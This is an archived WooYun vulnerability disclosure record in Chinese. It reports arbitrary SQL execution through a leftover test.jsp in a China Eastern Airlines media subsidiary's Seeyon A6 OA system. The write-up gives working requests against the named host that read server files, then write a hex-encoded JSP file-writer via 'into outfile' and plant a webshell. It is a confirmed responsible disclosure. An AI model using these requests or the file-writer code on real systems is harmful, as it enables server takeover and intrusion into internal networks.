{"id": 47304, "wybug_id": "wooyun-2015-0128322", "wybug_title": "东方航空传媒公司一个被忽略漏洞引发的血案（可getshell）", "wybug_corp": "中国东方航空股份有限公司", "wybug_author": "s4cr00t", "wybug_date": "2015-07-22 12:32", "wybug_open_date": "2015-09-05 12:52", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方程序漏洞"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-22：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-01：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-11：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-08-21：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-05：\t细节向公众公开  简要描述： 一个被忽略漏洞引发的血案 详细说明：  由之前被厂商忽略的一个漏洞引发的深入研究。这算是无良厂商吗？   漏洞证明：  东方航空某系统seeyon致远A6系统任意sql语句执行，可分分钟getshell获取系统主机权限。漏洞链接：http://cemftp.ce-air.com/yyoa/common/js/menu/test.jsp?doType=101&S1=select%20database()1、读取web根目录：http://cemftp.ce-air.com/yyoa/common/js/menu/test.jsp?doType=101&S1=select%20@@basedir\n\n2、猜到web绝对路径：http://cemftp.ce-air.com/yyoa/common/js/menu/test.jsp?doType=101&S1=select%20load_file(%27C:/Program%20Files/UFseeyon/OA/tomcat/webapps/yyoa/WEB-INF/web.xml%27)\n\n 3、利用mysql into outfile写shell：由于jsp一句话超长，请求连接会拒绝，故先上传写文件脚本，再本地构造进行webshell上传：a、写文件脚本：<%if(request.getParameter(\"f\")!=null)(new java.io.FileOutputStream(application.getRealPath(\"\\\\\")+request.getParameter(\"f\"))).write(request.getParameter(\"t\").getBytes());%>由于特殊符号存在，URL编码会造成写入后代码错误，故采用hex编码后unhex处理上传，写入文件名为：he1p.jsphttp://cemftp.ce-air.com/yyoa/common/js/menu/test.jsp?doType=101&S1=select%20unhex(%273C25696628726571756573742E676574506172616D657465722822662229213D6E756C6C29286E6577206A6176612E696F2E46696C654F757470757453747265616D286170706C69636174696F6E2E6765745265616C5061746828225C22292B726571756573742E676574506172616D65746572282266222929292E777269746528726571756573742E676574506172616D6574657228227422292E67657442797465732829293B253E%27)%20%20into%20outfile%20%27C:/Program%20Files/UFseeyon/OA/tomcat/webapps/yyoa/he1p.jsp%27b、本地构造上传：本地构造代码：\n\n 4、上传后获取webshell地址为：http://cemftp.ce-air.com/yyoa/we1come.jsp\n\n 5、系统权限，域环境，可内网\n\n \n\n\n\n  作一个守法的白帽子，点到为止，不再深入。   修复方案：  目前无法确定test.jsp的作用，S1变量获取提交sql语句直接执行，难道是后门？如果真没用，那就删掉test.jsp。   版权声明：转载请注明来源 s4cr00t@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-07-22 12:50 厂商回复： 十分感谢！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-07-22 13:11 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  好完整的过程    \n     2015-07-22 13:22 |    \t\tqhwlpg \t\t\t( 普通白帽子  |\t\t\t        Rank:226 漏洞数:54        | 潜心代码审计。)\t\t \n  要雷劈了么    \n     2015-07-22 18:08 |    \t\ts4cr00t \t\t\t( 路人 |\t\t\t        Rank:18 漏洞数:5        | 自由，共享，平等)\t\t \n  @疯狗 多谢狗哥，有详细完整过程，厂商才能快速定位并修复，降低损失。    \n     2015-09-05 12:55 |    \t\thellogk \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 一个走在风中的少年。)\t\t \n  不错    \n     2015-09-08 14:46 |    \t\t有归于无 \t\t\t( 实习白帽子  |\t\t\t        Rank:84 漏洞数:15        | 有归于无)\t\t \n  洞主知道登录的用户密码存在哪张表里的吗？    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}